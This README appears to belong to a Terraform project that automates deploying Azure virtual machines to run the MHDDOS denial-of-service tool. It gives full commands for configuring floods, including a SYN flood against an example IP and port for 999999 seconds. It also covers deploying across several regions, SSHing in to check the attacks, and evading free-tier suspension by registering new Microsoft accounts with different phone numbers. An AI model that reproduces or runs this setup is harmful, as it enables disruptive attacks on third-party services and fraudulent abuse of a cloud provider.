# Overview
Here I use Terraform to automate Azure VM deployment which run MHDDOS docker container.
You can deploy VMs to any Azure region, I prefer those that are located in Asia.   
- Default region - `koreacentral` (Central Korea)
- Default VM count - `4` (In free Azure subscription it's allowed only 4 vCPUs in a single region)
- Default VM SKU - `Standard_F1s` (1 vCPU, 2 GiB RAM, accelerated networking - ON, price around 0.05 USD/hour)
- Default resource group - `mhddosGroup`  

To change default values you can amend the`variables.tf` file, to customize through terminal:
```shell
terraform apply ... -var="<variableName>=<variableValue>"
```

# Prerequisites

You must have a Microsoft Azure account, it's better off using a free subscription (200 USD for 30 days).
Also, installed azure CLI and terraform tools are required. In general, udp/tcp/dns mhddos attacks
are network intensive so your free subscription will be suspended after a max of 24 hours of active attacks. SYN mhddos attack doesn't require many network resources thus you can use your subscription
longer.  
After your subscription is over you can register a new Microsoft account and apply for a new free Azure
subscription. The main rule here is to specify different phone number. If you have any other ideas
or real experience on creating multiple Microsoft Azure free accounts - feel free to describe this here using a pull request.

# Getting started

1. Log in Azure
```shell
az login
```
2. Initialize terraform
```shell
terraform init
```
2. Select target and type of attack by changing in `cloud-init.yaml` the `runcmd` attribute.  
`docker run --name mhddos --rm -d djebos/mhddos:latest` command is static and mustn't be changed. All your 
customizations must follow this command as in example below:

```yaml
# TCP syn flood attack on ip 15.61.23.9, port 53, 100 threads, duration 999999 seconds
runcmd:
  - docker run --name mhddos --rm -d djebos/mhddos:latest syn 15.61.23.9:53 100 999999
# here syn 15.61.23.9:53 100 999999 is your attack configuration that fully compliant with original MHDDOS
```
3. Deploy to the specified azure region (you must be logged in through `az login`). Examples:  
```shell
terraform apply -state india.tfstate -var="location=southindia" -var="resource_group_name=mhddosIndia"
terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea"
terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan"
```
4. Verify after a couple of minutes on azure portal the load of VMs' CPUs. It must be around 100%
5. Stop attack and destroy VMs. Examples:
```shell
terraform destroy -state india.tfstate
terraform destroy -state korea.tfstate 
terraform destroy -state japan.tfstate 
```
# Troubleshooting
Your attack could fail due to numerous reasons: wrong configuration, ip isn't reachable etc. Therefore, you 
have to connect to your VMs and figure things out. 
1. Find out the target VM public ip through Azure Portal or using terminal
```shell
terraform output -state <your_state_file>.tfstate instancePublicIPs
```
2. Export a private key to a file:
```shell
terraform output -raw -state <your_state_file>.tfstate tls_private_key > key.pem
```
3. Add read access:
```shell
chmod 400 key.pem
```
4. Connect via SSH:
```shell
ssh -i key.pem azureuser@<your_vm_IP>
```
5. Check a status of the `mhddos` docker container:
```shell
sudo docker ps
```